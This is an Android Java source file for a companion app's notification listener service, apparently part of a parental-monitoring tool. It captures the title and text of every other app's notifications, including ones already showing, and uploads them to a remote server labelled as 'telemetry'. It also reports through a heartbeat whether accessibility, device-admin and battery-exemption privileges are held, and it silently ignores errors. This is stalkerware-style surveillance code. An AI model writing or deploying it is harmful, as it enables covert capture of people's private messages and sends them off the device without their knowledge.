package com.snapapp.companion;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class SnapNotificationListener extends NotificationListenerService {

    private static volatile SnapNotificationListener sInstance;

    public static SnapNotificationListener getInstance() {
        return sInstance;
    }

    public static void fetchAndUploadActive(Context context) {
        if (sInstance == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && context != null) {
            try {
                requestRebind(new ComponentName(context, SnapNotificationListener.class));
            } catch (Throwable ignored) {}
        }
        if (sInstance == null) return;
        try {
            StatusBarNotification[] active = sInstance.getActiveNotifications();
            if (active != null) {
                for (StatusBarNotification sbn : active) {
                    sInstance.processAndUpload(sbn);
                }
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        processAndUpload(sbn);
    }

    private void processAndUpload(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (!TelemetrySyncHelper.isFeatureEnabled(this, "notifications")) return;

        String pkg = sbn.getPackageName();
        if (pkg == null || pkg.equals(getPackageName()) || pkg.equals("android") || pkg.equals("com.android.systemui")) {
            return;
        }

        Notification n = sbn.getNotification();
        Bundle extras = n.extras;

        String title = "";
        String text = "";

        if (extras != null) {
            CharSequence titleChar = extras.getCharSequence(Notification.EXTRA_TITLE);
            if (titleChar == null) titleChar = extras.getCharSequence(Notification.EXTRA_TITLE_BIG);
            if (titleChar != null) title = titleChar.toString().trim();

            CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
            if (textChar == null) textChar = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            if (textChar == null) textChar = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
            if (textChar == null) textChar = extras.getCharSequence(Notification.EXTRA_INFO_TEXT);
            if (textChar == null) textChar = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);

            if (textChar == null) {
                CharSequence[] lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
                if (lines != null && lines.length > 0) {
                    StringBuilder sb = new StringBuilder();
                    for (CharSequence line : lines) {
                        if (line != null && line.length() > 0) {
                            if (sb.length() > 0) sb.append("\n");
                            sb.append(line);
                        }
                    }
                    if (sb.length() > 0) text = sb.toString();
                }
            } else {
                text = textChar.toString().trim();
            }
        }

        if (text.isEmpty() && n.tickerText != null) {
            text = n.tickerText.toString().trim();
        }

        String appName = getAppName(pkg);
        if (title.isEmpty()) title = appName;

        if (title.isEmpty() && text.isEmpty()) return;

        long postTime = sbn.getPostTime();
        if (postTime <= 0) postTime = System.currentTimeMillis();

        TelemetrySyncHelper.uploadNotification(this, pkg, appName, title, text, postTime);
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        sInstance = this;
        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", true).apply();
        notifyHeartbeat(true);
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        sInstance = null;
        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", false).apply();
        notifyHeartbeat(false);
    }

    private void notifyHeartbeat(boolean isNotifActive) {
        try {
            SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
            String devId = prefs.getString("device_id", null);
            if (devId != null) {
                ApiClient.sendHeartbeat(server, devId, 100, false,
                    ParentalSetupHelper.isAccessibilityEnabled(this),
                    ParentalSetupHelper.isDeviceAdminActive(this),
                    ParentalSetupHelper.isBatteryOptimizationIgnored(this),
                    isNotifActive,
                    null, null);
            }
        } catch (Throwable ignored) {}
    }

    private String getAppName(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Throwable e) {
            return pkg;
        }
    }
}
